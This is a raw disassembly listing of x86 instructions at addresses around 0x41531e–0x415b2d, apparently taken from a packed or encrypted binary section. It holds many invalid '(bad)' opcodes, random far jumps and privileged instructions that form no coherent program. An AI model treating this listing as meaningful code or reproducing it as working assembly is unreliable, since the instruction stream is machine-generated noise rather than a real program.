  41531e:	or     DWORD PTR [esi],ebx
  415320:	fstp   st(3)
  415322:	nop
  415323:	bound  edx,QWORD PTR [ecx]
  415325:	mov    cl,0x1a
  415327:	sbb    DWORD PTR [esi+ecx*1],ebp
  41532a:	jle    0x4152be
  41532c:	pop    ebx
  41532d:	jnp    0x4153ae
  41532f:	dec    eax
  415330:	(bad)  
  415331:	sar    DWORD PTR ss:[edi+edx*2-0x8cab07c],0x7f
  41533a:	(bad)  
  41533b:	fmul   QWORD PTR [eax-0x6a7827f2]
  415341:	std    
  415342:	cmp    DWORD PTR [esi+0x2b],ebx
  415345:	adc    esp,DWORD PTR [edx+0x56]
  415348:	ret    0xbe2b
  41534b:	(bad)  
  41534c:	aam    0x26
  41534e:	push   eax
  41534f:	pusha  
  415350:	mov    ds:0x6af4b11f,eax
  415355:	stos   BYTE PTR es:[edi],al
  415356:	push   edx
  415357:	sub    DWORD PTR [edi+0x4cbf64fe],ebp
  41535d:	repz stc 
  41535f:	mov    ah,bh
  415361:	push   edi
  415362:	stc    
  415363:	cld    
  415364:	inc    esi
  415365:	popf   
  415366:	arpl   cx,bx
  415368:	pop    es
  415369:	jge    0x41531a
  41536b:	pop    esi
  41536c:	addr16 jb 0x415317
  41536f:	cli    
  415370:	cmp    ebp,eax
  415372:	pop    edi
  415373:	ins    BYTE PTR es:[edi],dx
  415374:	jb     0x4153d0
  415376:	out    0x6,al
  415378:	div    DWORD PTR [ecx-0x2b]
  41537b:	out    0x2c,eax
  41537d:	inc    esi
  41537e:	nop
  41537f:	xchg   esp,eax
  415380:	adc    al,0xc5
  415382:	and    BYTE PTR [esi-0x3cfc06eb],0x8d
  415389:	pop    ss
  41538a:	int3   
  41538b:	sbb    BYTE PTR [ebx-0x11],ah
  41538e:	inc    edi
  41538f:	push   ebx
  415390:	dec    edi
  415391:	pusha  
  415392:	add    al,0xf8
  415394:	jo     0x4153c6
  415396:	mov    WORD PTR [edi],gs
  415398:	pop    ebp
  415399:	mov    ecx,0x5165cb67
  41539e:	jne    0x41540e
  4153a0:	cs xchg ebp,eax
  4153a2:	(bad)  
  4153a3:	daa    
  4153a4:	mov    WORD PTR [ecx],fs
  4153a6:	or     bl,BYTE PTR [edi-0x4b0259d4]
  4153ac:	xchg   DWORD PTR [edi],edi
  4153ae:	add    eax,0x278faa63
  4153b3:	and    esi,DWORD PTR [edi]
  4153b5:	jge    0x415339
  4153b7:	loopne 0x4153a6
  4153b9:	mov    ebp,0x60b66296
  4153be:	call   0xa53bc9ed
  4153c3:	push   0xffffffc6
  4153c5:	pop    esi
  4153c6:	xlat   BYTE PTR ds:[ebx]
  4153c7:	mov    ds:0xb8071b8a,eax
  4153cc:	add    al,0x18
  4153ce:	dec    ebp
  4153cf:	sbb    DWORD PTR [ebp+0x3f],ebx
  4153d2:	rol    DWORD PTR [edx],cl
  4153d4:	ret    0x2908
  4153d7:	add    dl,BYTE PTR [eax-0x7c7cb5e4]
  4153dd:	push   ebp
  4153de:	into   
  4153df:	out    dx,eax
  4153e0:	daa    
  4153e1:	js     0x41540d
  4153e3:	sbb    cl,BYTE PTR [eax-0x52]
  4153e6:	(bad)  
  4153e8:	test   al,0x3
  4153ea:	loopne 0x41538b
  4153ec:	cwde   
  4153ed:	shr    DWORD PTR [edi+edi*8-0x71482afb],cl
  4153f4:	cmp    dh,BYTE PTR [esi+0x7a]
  4153f7:	push   0x2311df90
  4153fc:	mov    WORD PTR [ebp-0x53],gs
  4153ff:	xlat   BYTE PTR ds:[ebx]
  415400:	es js  0x4153a4
  415403:	int    0x4a
  415405:	adc    ecx,DWORD PTR [edx+0x32]
  415408:	loop   0x4153e5
  41540a:	jle    0x4153fd
  41540c:	and    BYTE PTR [edx-0x7570e69e],dl
  415412:	test   BYTE PTR [edx],cl
  415414:	mov    dh,0x1
  415416:	push   ebp
  415417:	inc    edi
  415418:	and    ebx,DWORD PTR [edi-0x72]
  41541b:	adc    BYTE PTR [ebp+0x1d],bh
  41541e:	inc    esi
  41541f:	and    al,0x60
  415421:	loopne 0x4153ca
  415423:	ret    0x762a
  415426:	sub    eax,0x7948c831
  41542b:	popa   
  41542c:	aas    
  41542d:	ins    DWORD PTR es:[edi],dx
  41542e:	xchg   ebx,eax
  41542f:	fwait
  415430:	rcr    BYTE PTR [esi],1
  415432:	mov    dh,0x18
  415434:	xchg   ebp,eax
  415435:	cs ds jne 0x415462
  415439:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41543b:	lds    ebx,FWORD PTR [ebx-0x64e70139]
  415441:	retf   
  415442:	dec    ebp
  415443:	mov    ah,0xcb
  415445:	pusha  
  415446:	xchg   ebp,eax
  415447:	jmp    0x9d69e71a
  41544c:	out    dx,al
  41544d:	mov    ecx,0xd8819b07
  415452:	aad    0x72
  415454:	scas   al,BYTE PTR es:[edi]
  415455:	scas   eax,DWORD PTR es:[edi]
  415456:	pop    esi
  415457:	add    BYTE PTR [edx],ah
  415459:	fcomp  QWORD PTR [edx-0x6aea1a81]
  41545f:	jmp    0xb384:0x80307433
  415466:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415467:	mov    cs,WORD PTR [ebp+0x6aca9253]
  41546d:	cli    
  41546e:	sub    ax,0x8f9a
  415472:	inc    esi
  415473:	fnstcw WORD PTR [eax+0x53]
  415476:	(bad)  
  415477:	cli    
  415478:	pop    ss
  415479:	fwait
  41547a:	int    0xdd
  41547c:	or     ebx,DWORD PTR [esi]
  41547e:	imul   edx,DWORD PTR [ebp+0x4c1c2cf7],0xd005e8ce
  415488:	inc    edx
  415489:	sub    al,0xdd
  41548b:	adc    DWORD PTR [ebx-0x18fdeaee],0x261d23d1
  415495:	(bad)  
  415497:	data16 jge 0x415501
  41549a:	jne    0x415502
  41549c:	sub    eax,0xb4d21368
  4154a1:	test   BYTE PTR [ebp-0x45],bl
  4154a4:	mov    ds:0x5fb28c99,eax
  4154a9:	cmp    DWORD PTR [ecx+ebp*2+0xf51f4a1],eax
  4154b0:	das    
  4154b1:	xchg   BYTE PTR [edi-0x7],ah
  4154b4:	xchg   edx,eax
  4154b5:	ins    BYTE PTR es:[edi],dx
  4154b6:	cld    
  4154b7:	ja     0x4154ff
  4154b9:	adc    eax,0xeb2814a8
  4154be:	inc    ebx
  4154bf:	nop
  4154c0:	js     0x4154c7
  4154c2:	in     al,0x62
  4154c4:	(bad)  
  4154c5:	adc    ebp,DWORD PTR [edx-0x161b169f]
  4154cb:	adc    ah,cl
  4154cd:	cld    
  4154ce:	test   al,0x13
  4154d0:	mov    fs,WORD PTR [ebx-0x7f]
  4154d3:	fmul   QWORD PTR [esi]
  4154d5:	cli    
  4154d6:	retf   0x230c
  4154d9:	xor    ecx,edi
  4154db:	sub    esp,DWORD PTR [edi+0x1c9f14b]
  4154e1:	xor    ebx,DWORD PTR [ebx+0x44277b39]
  4154e7:	cli    
  4154e8:	push   0xffffffd0
  4154ea:	xchg   ebp,eax
  4154eb:	adc    al,0xab
  4154ed:	sub    BYTE PTR [ecx],bh
  4154ef:	mov    ch,BYTE PTR [ebx-0x449ffe0]
  4154f5:	pop    es
  4154f6:	sbb    ch,BYTE PTR [ecx+ebp*4]
  4154f9:	sbb    ecx,0xa411f718
  4154ff:	inc    bx
  415501:	(bad)  
  415502:	jb     0x4154b7
  415504:	xor    DWORD PTR [esi+edi*2],0xf66f6a23
  41550b:	mov    eax,ds:0x1b92d119
  415510:	or     bh,al
  415512:	outs   dx,BYTE PTR ds:[esi]
  415513:	aaa    
  415514:	mov    eax,0x40ad32d4
  415519:	pop    ss
  41551a:	icebp  
  41551b:	es cli 
  41551d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41551e:	inc    ebx
  41551f:	and    eax,0x15c5375d
  415524:	add    BYTE PTR [esi+0x5e65e844],dl
  41552a:	repz adc al,0xb2
  41552d:	(bad)  
  41552e:	aam    0x55
  415530:	sub    al,0x6f
  415532:	mov    edi,0xd41de202
  415537:	jno    0x4155ad
  415539:	fcomp  DWORD PTR [eax]
  41553b:	add    ecx,0xce28550e
  415541:	cld    
  415542:	sbb    DWORD PTR [ebp-0x7f],ebx
  415545:	fadd   st,st(4)
  415547:	xchg   edi,eax
  415548:	pop    ebx
  415549:	xchg   cx,ax
  41554b:	into   
  41554c:	add    al,bl
  41554e:	mov    dh,0xb9
  415550:	adc    DWORD PTR ds:0x76f085a9,0x64
  415557:	pop    eax
  415558:	add    cl,bl
  41555a:	inc    esp
  41555b:	jae    0x41551a
  41555d:	jmp    0x4155a3
  41555f:	mov    bh,0x5d
  415561:	push   esp
  415562:	xchg   DWORD PTR [edx+ebp*4+0x35],ecx
  415566:	mov    esp,0x4f2a3c2c
  41556b:	(bad)  
  41556c:	jne    0x4155d7
  41556e:	or     DWORD PTR [ebp+0x10],edi
  415571:	call   0x98257cee
  415576:	push   es
  415577:	cld    
  415578:	sub    BYTE PTR [edx+esi*2-0x68],ch
  41557c:	pushf  
  41557d:	clc    
  41557e:	mov    edx,0xb64fb1c0
  415583:	fs xchg esi,eax
  415585:	fidivr WORD PTR [esi]
  415587:	loopne 0x4155b1
  415589:	xor    eax,DWORD PTR [ebx-0x5e]
  41558c:	push   eax
  41558d:	add    esi,DWORD PTR [ebp+0x2]
  415590:	add    al,0x7f
  415592:	sbb    ecx,DWORD PTR [edx]
  415594:	(bad)  [esi+0x437e637d]
  41559a:	mov    fs,WORD PTR [edx]
  41559c:	popf   
  41559d:	adc    eax,DWORD PTR [eax]
  41559f:	shl    DWORD PTR [edi+0x36],1
  4155a2:	xchg   ebx,eax
  4155a3:	xor    BYTE PTR [esi],al
  4155a5:	adc    esi,0x29e939f5
  4155ab:	cmp    ebx,DWORD PTR ds:0x971e8e6c
  4155b1:	mov    eax,0x1438bce0
  4155b6:	js     0x41558e
  4155b8:	pop    ebp
  4155b9:	(bad)  
  4155ba:	pop    ds
  4155bb:	sbb    BYTE PTR [edi+0x6aec5c7c],dl
  4155c1:	add    ebx,esi
  4155c3:	pop    esi
  4155c4:	pop    es
  4155c5:	pop    esp
  4155c6:	cmp    al,0xbb
  4155c8:	and    BYTE PTR [esi-0x25c502d0],ch
  4155ce:	out    0xc1,al
  4155d0:	outs   dx,DWORD PTR ds:[esi]
  4155d1:	ins    BYTE PTR es:[edi],dx
  4155d2:	fld    TBYTE PTR [ecx-0x74]
  4155d5:	jmp    0x37a8:0x6c29e65
  4155dc:	pusha  
  4155dd:	loope  0x415597
  4155df:	or     BYTE PTR [edx+edi*2-0x721b5194],cl
  4155e6:	pop    es
  4155e7:	stc    
  4155e8:	xor    ch,BYTE PTR [esi-0x37]
  4155eb:	test   eax,0xb3b04962
  4155f0:	stos   BYTE PTR es:[edi],al
  4155f1:	sub    dh,BYTE PTR [edx+ecx*1-0x1c]
  4155f5:	sbb    BYTE PTR [eax+0x7cc658e0],0xa5
  4155fc:	xor    BYTE PTR [ebx+0x13],0x72
  415600:	xchg   edi,eax
  415601:	jo     0x4155fd
  415603:	jmp    0xa37da10c
  415608:	push   ds
  415609:	sbb    cl,ah
  41560b:	faddp  st(7),st
  41560d:	lea    eax,[esi]
  41560f:	lock inc ebp
  415611:	dec    edi
  415612:	sub    al,0xca
  415614:	pop    ebp
  415615:	out    0x4,al
  415617:	sbb    BYTE PTR [esi+0x2e],ch
  41561a:	mov    dl,0xbb
  41561c:	jecxz  0x4155a7
  41561e:	pop    edx
  41561f:	fidiv  DWORD PTR [edx-0x176d0f42]
  415625:	iret   
  415626:	mov    ebx,0x9bc07090
  41562b:	and    al,0x10
  41562d:	mov    ds:0x9448e5d,al
  415632:	xchg   ecx,eax
  415633:	add    BYTE PTR [eax+0x1a93417b],dh
  415639:	pop    ss
  41563a:	fadd   st,st(1)
  41563c:	sub    DWORD PTR [ebp+0x45fb2f9d],0x3d
  415643:	xor    al,ah
  415645:	aaa    
  415646:	test   DWORD PTR [edi-0x213df552],edi
  41564c:	pop    ebx
  41564d:	repnz add DWORD PTR [ebp+0x17],edx
  415651:	scas   al,BYTE PTR es:[edi]
  415652:	jo     0x41561b
  415654:	mov    bl,0x1
  415656:	push   edi
  415657:	push   edx
  415658:	aam    0x4
  41565a:	rol    DWORD PTR ds:0xad8e330a,1
  415660:	cmp    BYTE PTR [esi-0x155acf0d],bl
  415666:	sbb    eax,0xc5ee937e
  41566b:	push   esi
  41566c:	jne    0x4156e0
  41566e:	fldcw  WORD PTR [edx+0x76]
  415671:	cmp    eax,0xa30bca7
  415676:	and    BYTE PTR [edx-0x48],0xf0
  41567a:	arpl   WORD PTR [edi-0xaab3df5],dx
  415680:	jmp    0x4654:0xb06e181a
  415687:	loopne 0x41568e
  415689:	push   edx
  41568a:	jge    0x41568c
  41568c:	icebp  
  41568d:	sar    DWORD PTR [esi+0x798045ff],0x8e
  415694:	push   esi
  415695:	stos   BYTE PTR es:[edi],al
  415696:	xchg   ecx,eax
  415697:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415698:	jmp    0x6baf31c1
  41569d:	sbb    DWORD PTR [edx-0x47b0ef5f],0x1c
  4156a4:	adc    DWORD PTR ds:[eax],edi
  4156a7:	or     eax,DWORD PTR ds:0x1a66685f
  4156ad:	or     dh,bl
  4156af:	mov    ch,0xc6
  4156b1:	fnstcw WORD PTR ds:0x9a103c19
  4156b7:	xchg   ebp,edi
  4156b9:	xchg   edx,eax
  4156ba:	push   ds
  4156bb:	rcr    BYTE PTR [esi+ebp*2+0x68c41cb3],cl
  4156c2:	shl    DWORD PTR [ebp-0x16461ef4],1
  4156c8:	js     0x41569d
  4156ca:	cmp    BYTE PTR [ebx+ecx*8+0x6d],dh
  4156ce:	mov    esi,0xfd5f42e7
  4156d3:	adc    bh,BYTE PTR [esi]
  4156d5:	push   cs
  4156d6:	sbb    eax,0xdb86c4d1
  4156db:	call   0x350:0x51cf0003
  4156e2:	aad    0xcb
  4156e4:	fstp   TBYTE PTR [ecx]
  4156e6:	ins    BYTE PTR es:[edi],dx
  4156e7:	dec    esp
  4156e8:	mov    esi,0xc4f44aab
  4156ed:	gs ja  0x41572e
  4156f0:	pop    ebx
  4156f1:	jmp    0x460bb085
  4156f6:	repnz adc DWORD PTR [eax-0xe],ebx
  4156fa:	inc    edx
  4156fb:	enter  0xacf8,0x3f
  4156ff:	das    
  415700:	mov    BYTE PTR [ebx-0x7b5cc8c6],ch
  415706:	push   ebp
  415707:	adc    dl,BYTE PTR [ebx]
  415709:	sbb    eax,0xa1d5f3f6
  41570e:	inc    ebp
  41570f:	xor    DWORD PTR [ecx+0x53],esi
  415712:	push   ds
  415713:	add    edx,DWORD PTR [edx+0x6f49aa0b]
  415719:	out    0x2b,al
  41571b:	call   0xd087f88a
  415720:	and    al,0xef
  415722:	inc    edx
  415723:	inc    ebx
  415724:	sqrtps xmm2,XMMWORD PTR ds:0xae2b8d65
  41572b:	fstp   DWORD PTR [ebx+0x61ad517]
  415731:	mov    esp,0xba715a8b
  415736:	xchg   ebp,eax
  415737:	dec    edi
  415738:	popa   
  415739:	jb     0x4156c4
  41573b:	ds sub al,0xf1
  41573e:	and    DWORD PTR [esi],0xffffffbc
  415741:	add    al,0xc8
  415743:	cmp    dl,dh
  415745:	cmp    DWORD PTR [edx],edi
  415747:	cwde   
  415748:	pop    ecx
  415749:	arpl   WORD PTR [ebp-0x3e578be0],cx
  41574f:	mov    eax,ds:0xbd472c73
  415754:	mov    edi,0xd4923f37
  415759:	mov    ebp,0xa1e715c6
  41575e:	jne    0x415720
  415760:	jae    0x415742
  415762:	js     0x4157db
  415764:	aas    
  415765:	mov    gs,WORD PTR [eax+0x51]
  415768:	(bad)  
  415769:	nop
  41576a:	aad    0x69
  41576c:	mov    WORD PTR [eax+ebx*8],ds
  41576f:	popf   
  415770:	sbb    DWORD PTR [ebp-0x3f85a907],ebp
  415776:	push   ecx
  415777:	ret    0x57f0
  41577a:	and    edx,DWORD PTR [esi-0x1]
  41577d:	push   edi
  41577e:	arpl   WORD PTR [ecx+0x76ca49bb],di
  415784:	mov    al,0x55
  415786:	test   DWORD PTR [eax],edx
  415788:	xor    BYTE PTR [ebx-0x4e],dl
  41578b:	loop   0x415736
  41578d:	rcl    BYTE PTR [edx+0x6a],cl
  415790:	mov    eax,0x5c437bca
  415795:	js     0x415732
  415797:	repz jmp 0x415727
  41579a:	shr    DWORD PTR [ebx+0x3a],cl
  41579d:	jno    0x415720
  41579f:	push   ebp
  4157a0:	retf   
  4157a1:	jmp    0x415766
  4157a3:	mov    BYTE PTR [edi+0x2c],cl
  4157a6:	cld    
  4157a7:	fiadd  DWORD PTR [edi-0x3e419773]
  4157ad:	mov    dh,0x78
  4157af:	pop    ebp
  4157b0:	dec    edi
  4157b1:	(bad)  
  4157b2:	jb     0x41582b
  4157b4:	xchg   esi,eax
  4157b5:	cmp    BYTE PTR [edi],dh
  4157b7:	les    esi,FWORD PTR [esi]
  4157b9:	mov    al,ds:0x7939e1d9
  4157be:	or     BYTE PTR [ebp-0x75105649],ah
  4157c4:	aaa    
  4157c5:	xor    al,bh
  4157c7:	outs   dx,DWORD PTR ds:[esi]
  4157c8:	cdq    
  4157c9:	mov    ah,0xfc
  4157cb:	adc    al,0xe8
  4157cd:	(bad)  
  4157ce:	clc    
  4157cf:	mov    edx,0x7a98d621
  4157d4:	fwait
  4157d5:	call   0x84ef:0xdd0f5c7e
  4157dc:	add    al,0xe8
  4157de:	loop   0x4157e0
  4157e0:	cli    
  4157e1:	pop    ecx
  4157e2:	cli    
  4157e3:	(bad)  
  4157e4:	loope  0x415834
  4157e6:	sbb    DWORD PTR [ebx-0x267b00a6],eax
  4157ec:	add    BYTE PTR [eax+edx*4],0x45
  4157f0:	xor    eax,0xa0e598af
  4157f5:	mov    ds:0xfe68e2ae,al
  4157fa:	enter  0x7d7e,0xd8
  4157fe:	stc    
  4157ff:	jns    0x4157a8
  415801:	loop   0x415857
  415803:	and    esp,DWORD PTR es:[ebx]
  415806:	jecxz  0x41580d
  415808:	push   ecx
  415809:	inc    ebp
  41580a:	ss xchg esp,eax
  41580c:	or     eax,edx
  41580e:	ss xor ch,ch
  415811:	inc    esp
  415812:	xor    al,0x56
  415814:	ins    BYTE PTR es:[edi],dx
  415815:	adc    al,0xc3
  415817:	jb     0x4157f2
  415819:	pop    ds
  41581a:	push   eax
  41581b:	icebp  
  41581c:	stos   BYTE PTR es:[edi],al
  41581d:	repz cmp DWORD PTR [esi-0x3428827],ecx
  415824:	mov    al,0x38
  415826:	jnp    0x4157af
  415828:	pop    ecx
  415829:	add    DWORD PTR [edi],ecx
  41582b:	adc    al,0xdd
  41582d:	and    ebx,DWORD PTR [edx]
  41582f:	push   ss
  415830:	ss loopne 0x415829
  415833:	add    cl,dh
  415835:	aad    0xb
  415837:	out    dx,al
  415838:	fisttp DWORD PTR [esi+0xe]
  41583b:	gs jmp 0xca12:0x1aba066a
  415843:	mov    dh,0x15
  415845:	push   ecx
  415846:	add    ebx,DWORD PTR [esi+0x5ed0086c]
  41584c:	xchg   BYTE PTR [edx-0x3095d3a0],dl
  415852:	jmp    0x631c:0x239b0f08
  415859:	and    BYTE PTR [edx+eiz*1-0x7c],bh
  41585d:	cwde   
  41585e:	inc    edx
  41585f:	dec    edx
  415860:	or     BYTE PTR [edx-0x66],dh
  415863:	aam    0x11
  415865:	test   BYTE PTR [edx-0x56676e4d],0x1c
  41586c:	push   eax
  41586d:	scas   al,BYTE PTR es:[edi]
  41586e:	sbb    dh,0xfb
  415871:	out    dx,eax
  415872:	cld    
  415873:	mov    ebx,0xa683f034
  415878:	fisttp WORD PTR [ebp-0x6a]
  41587b:	inc    eax
  41587c:	push   ebp
  41587d:	sbb    eax,0xa927569b
  415882:	sbb    eax,0xa1cc8f31
  415887:	fwait
  415888:	push   ecx
  415889:	pop    ebx
  41588a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41588b:	call   0xf4782df9
  415890:	adc    BYTE PTR [eax+0x6c819d7b],bh
  415896:	push   cs
  415897:	fucomi st,st(6)
  415899:	or     eax,0x45cd8e13
  41589e:	dec    esp
  41589f:	jge    0x4158ee
  4158a1:	mov    al,0x13
  4158a3:	rol    DWORD PTR [ebx+0x5e],0x8
  4158a7:	cmp    eax,0xb95f6f1
  4158ac:	sti    
  4158ad:	adc    BYTE PTR [ebx+0x79],0xc3
  4158b1:	jge    0x4158bc
  4158b3:	enter  0x12f7,0x34
  4158b7:	mov    al,ds:0x2c5d0a82
  4158bc:	inc    ebp
  4158bd:	adc    BYTE PTR [edx+0x4b60e64e],cl
  4158c3:	dec    edx
  4158c4:	or     dh,cl
  4158c6:	call   0xcc81:0x8cb24891
  4158cd:	or     DWORD PTR [edx],edx
  4158cf:	cmp    al,0x85
  4158d1:	push   ds
  4158d2:	jns    0x415876
  4158d4:	fisub  WORD PTR [eax-0x19]
  4158d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4158d8:	or     DWORD PTR [edi],ecx
  4158da:	repnz das 
  4158dc:	idiv   al
  4158de:	out    0x11,eax
  4158e0:	xchg   DWORD PTR [ecx+0x31],ecx
  4158e3:	arpl   WORD PTR [ebx-0x78016ce3],dx
  4158e9:	das    
  4158ea:	xchg   edi,eax
  4158eb:	add    DWORD PTR ds:0x3b3e7ba1,ebp
  4158f1:	jle    0x415968
  4158f3:	aad    0xa
  4158f5:	mov    al,0xe2
  4158f7:	aad    0x78
  4158f9:	pop    ebx
  4158fa:	xchg   ebx,eax
  4158fb:	lods   al,BYTE PTR ds:[esi]
  4158fc:	test   esi,ebx
  4158fe:	dec    esp
  4158ff:	sub    BYTE PTR [edi+ebp*8+0x63ee3acc],dl
  415906:	and    ch,BYTE PTR [bx+di-0x2a]
  41590a:	xchg   ebp,eax
  41590b:	push   edi
  41590c:	retf   
  41590d:	mov    ebp,0xc6fbc9b7
  415912:	aaa    
  415913:	xor    DWORD PTR [edi+0x345567f2],ecx
  415919:	cmp    edi,edx
  41591b:	jns    0x41591c
  41591d:	add    DWORD PTR [ecx+0x7a044cf8],0x2c
  415924:	fwait
  415925:	or     al,0xf3
  415927:	hlt    
  415928:	dec    esp
  415929:	push   0xffffff8b
  41592b:	pop    esp
  41592c:	mov    ch,0xc8
  41592e:	sar    BYTE PTR [edx-0x2ac3da21],0x50
  415935:	pop    edx
  415936:	jmp    0x41597e
  415938:	call   0x3710:0xf071ddbd
  41593f:	jno    0x415917
  415941:	and    ebx,eax
  415943:	xor    eax,0xb1513bcd
  415948:	cvtps2pd xmm4,QWORD PTR [ebp+ecx*4-0x6d54b2d1]
  415950:	add    eax,0x57b69b15
  415955:	jecxz  0x415902
  415957:	push   esi
  415958:	push   edi
  415959:	in     al,dx
  41595a:	les    edx,FWORD PTR [ebp-0x7c]
  41595d:	mov    esp,0x16c341db
  415962:	gs jne 0x4159dc
  415965:	in     ax,0x3c
  415968:	cwde   
  415969:	sub    BYTE PTR [ecx],0xdb
  41596c:	inc    ecx
  41596d:	or     DWORD PTR [edi-0x2055aebb],0xc56f793
  415977:	inc    ecx
  415978:	and    eax,0xa6a8a38c
  41597d:	test   DWORD PTR es:0xfcfdf7da,ecx
  415984:	retf   0x707
  415987:	mov    ds:0x795741ce,eax
  41598c:	aam    0x61
  41598e:	inc    ecx
  41598f:	leave  
  415990:	cs hlt 
  415992:	mov    DWORD PTR [eax],esp
  415994:	xchg   BYTE PTR [ebp+eiz*2-0x7cb53017],bl
  41599b:	jbe    0x415988
  41599d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41599e:	inc    edx
  41599f:	clc    
  4159a0:	jg     0x415a03
  4159a2:	adc    eax,0xbd3ce225
  4159a7:	in     eax,dx
  4159a8:	inc    ebp
  4159a9:	push   ss
  4159aa:	or     eax,DWORD PTR [edx+eiz*2]
  4159ad:	cmp    esp,DWORD PTR [edi]
  4159af:	dec    edi
  4159b0:	cmc    
  4159b1:	addr16 mov ch,0x66
  4159b4:	lea    esi,[ebp-0x6ff10fdd]
  4159ba:	xchg   edx,eax
  4159bb:	add    edi,DWORD PTR [ebx+0x68d96b0b]
  4159c1:	dec    edi
  4159c2:	mov    ebp,0xf9f111fc
  4159c7:	pop    esp
  4159c8:	mov    bh,0x77
  4159ca:	jp     0x415989
  4159cc:	sub    ebp,DWORD PTR [eax-0x2e]
  4159cf:	push   0x48
  4159d1:	push   esp
  4159d2:	into   
  4159d3:	pop    ss
  4159d4:	mov    DWORD PTR [edi-0x6],ecx
  4159d7:	imul   ebp,DWORD PTR [edi+0x6cc15008],0xffffffeb
  4159de:	adc    eax,0xe830d0ba
  4159e3:	push   0xec8a4ec6
  4159e8:	mov    ah,BYTE PTR ds:0x5a80cec
  4159ee:	sub    al,0x1e
  4159f0:	loopne 0x415993
  4159f2:	cmc    
  4159f3:	push   esp
  4159f4:	fild   WORD PTR [eax+0x3b08b804]
  4159fa:	mov    ah,0x46
  4159fd:	dec    ebx
  4159fe:	dec    eax
  4159ff:	pop    esi
  415a00:	cld    
  415a01:	bound  ebp,QWORD PTR [eax]
  415a03:	fsub   DWORD PTR [esi+edi*2+0x2e]
  415a07:	jnp    0x415a48
  415a09:	rol    BYTE PTR [ebx],cl
  415a0b:	fs test al,0x9e
  415a0e:	(bad)  
  415a0f:	push   ebx
  415a10:	inc    edx
  415a11:	push   eax
  415a12:	mov    ah,0xf
  415a14:	pop    eax
  415a15:	ja     0x415a5f
  415a17:	push   0x25
  415a19:	cwde   
  415a1a:	adc    esp,eax
  415a1c:	push   esi
  415a1d:	lahf   
  415a1e:	sub    ebx,DWORD PTR [eax+0x2c]
  415a21:	cmp    dl,BYTE PTR [ebp-0x15]
  415a24:	sbb    ebx,DWORD PTR [edx+ecx*2-0xc9a59a4]
  415a2b:	push   cs
  415a2c:	dec    edx
  415a2d:	aas    
  415a2e:	into   
  415a2f:	push   esp
  415a30:	popa   
  415a31:	outs   dx,DWORD PTR ds:[esi]
  415a32:	test   eax,0x4c19a83e
  415a37:	fwait
  415a38:	push   es
  415a39:	test   ah,ch
  415a3b:	shl    bl,0x4d
  415a3e:	and    ebx,DWORD PTR [edx]
  415a40:	es and dh,ch
  415a43:	fadd   QWORD PTR [esi]
  415a45:	inc    eax
  415a46:	lahf   
  415a47:	inc    edi
  415a48:	and    BYTE PTR [edx],dh
  415a4a:	retf   0x68ba
  415a4d:	loopne 0x415abf
  415a4f:	fdiv   QWORD PTR [bx+si+0x1]
  415a53:	call   0x86c7:0x7eb696f5
  415a5a:	pop    ss
  415a5b:	les    ebx,FWORD PTR [eax]
  415a5d:	dec    esp
  415a5e:	inc    ecx
  415a5f:	mov    dl,0x49
  415a61:	jmp    0x415a8f
  415a63:	pop    ebx
  415a64:	pop    ss
  415a65:	cmp    al,0xc4
  415a67:	shr    bl,cl
  415a69:	mov    edx,0x89f4eb7e
  415a6e:	popa   
  415a6f:	inc    ebx
  415a70:	xor    al,0x27
  415a72:	sub    al,0x71
  415a74:	arpl   WORD PTR [esi-0x7c],bp
  415a77:	sbb    al,0xbd
  415a79:	push   ecx
  415a7a:	sub    eax,0xb5c68e3
  415a7f:	jecxz  0x415abb
  415a81:	lods   al,BYTE PTR ds:[esi]
  415a82:	lea    eax,[eax]
  415a84:	cdq    
  415a85:	mov    esi,0x44bcf934
  415a8a:	popf   
  415a8b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415a8c:	xlat   BYTE PTR ds:[ebx]
  415a8d:	jnp    0x415aa3
  415a8f:	std    
  415a90:	xchg   edx,eax
  415a91:	add    BYTE PTR [edx-0x7e],ch
  415a94:	addr16 mov dh,0xdf
  415a97:	int    0x4d
  415a99:	icebp  
  415a9a:	push   eax
  415a9b:	aam    0x84
  415a9d:	div    BYTE PTR [ebx]
  415a9f:	sub    al,0xc8
  415aa1:	leave  
  415aa2:	push   eax
  415aa3:	or     BYTE PTR [edi-0x7f],bh
  415aa6:	inc    esp
  415aa7:	sub    DWORD PTR ds:0xc5b45906,ecx
  415aad:	mov    WORD PTR [ebx+0x2352df74],?
  415ab3:	cmp    ah,BYTE PTR [ebp+0x632db58d]
  415ab9:	dec    esp
  415aba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415abb:	es jae 0x415a8a
  415abe:	add    al,0x3c
  415ac0:	es jb  0x415a8a
  415ac3:	ja     0x415af6
  415ac5:	es out dx,al
  415ac7:	cmp    eax,0x3c79ec7f
  415acc:	pop    es
  415acd:	sub    DWORD PTR [edi+0x7748ee47],esi
  415ad3:	ret    
  415ad4:	imul   ecx,DWORD PTR [esi],0xa8234964
  415ada:	aad    0x1c
  415adc:	and    cl,BYTE PTR [ecx]
  415ade:	repz fadd st(6),st
  415ae1:	push   cs
  415ae2:	dec    esi
  415ae3:	fnstcw WORD PTR [eax+0x7112fec7]
  415ae9:	adc    eax,0x71c8e664
  415aee:	xchg   ecx,eax
  415aef:	sub    ecx,eax
  415af1:	adc    al,0xe7
  415af3:	jmp    0x415a77
  415af5:	(bad)  
  415af7:	pop    ecx
  415af8:	repz push ebp
  415afa:	hlt    
  415afb:	jge    0x415b62
  415afd:	dec    edx
  415afe:	iret   
  415aff:	imul   eax,esi,0x12
  415b02:	push   eax
  415b03:	int    0xcf
  415b05:	or     al,BYTE PTR [eax+0x1d]
  415b08:	adc    ch,0x8c
  415b0b:	add    bh,BYTE PTR [ebp+0x72]
  415b0e:	dec    ecx
  415b0f:	ja     0x415ac6
  415b11:	or     eax,0x39836061
  415b16:	adc    ebx,DWORD PTR [eax+0x3524d79b]
  415b1c:	jno    0x415b4a
  415b1e:	(bad)  [esi-0x7ecb43b8]
  415b24:	nop
  415b25:	dec    edi
  415b26:	repnz xchg edi,eax
  415b28:	mov    edx,0x728cabea
  415b2d:	out    0xe8,eax
